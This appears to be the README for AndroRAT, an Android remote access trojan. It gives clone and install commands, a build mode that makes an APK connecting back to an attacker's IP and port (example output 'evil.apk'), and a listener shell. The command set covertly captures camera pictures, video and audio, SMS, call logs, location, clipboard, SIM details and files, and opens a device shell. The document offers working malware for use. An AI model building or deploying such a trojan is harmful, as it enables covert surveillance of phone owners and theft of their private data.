## Prerequisites
AndroRAT requires Python (> 3.6) and JAVA 8 (or Android Studio)

## Installation
```
git clone https://github.com/karma9874/AndroRAT.git
pip install colorama
```
#### Note: 
While cloning the repository using Git bash on windows, you may get the following error:
> error: unable to create file \<filename>: Filename too long

This is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there's a limit of 260 characters for a filename. 

You can circumvent this by setting `core.longpaths` to `true`.

> git config --system core.longpaths true

You must run Git bash with administrator privileges. 

## Usage (Windows and Linux)
### Available Modes
* `--build` - for building the android apk 
* `--shell` - getting an interactive shell of the device
### `build` mode
```
Usage:
  python androRAT.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
```
Or you can manually build the apk by importing [Android Code](https://github.com/karma9874/AndroRAT/tree/master/Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](https://github.com/karma9874/AndroRAT/blob/master/Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `shell` mode
```
Usage:
  python androRAT.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the `shell` mode you will get an interpreter of the device  

Commands which can run on the interpreter
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```
In the sh shell there are some sub commands
```
    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
    put [filename]              --> uploads the file to the android device
```

## Examples

```python androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
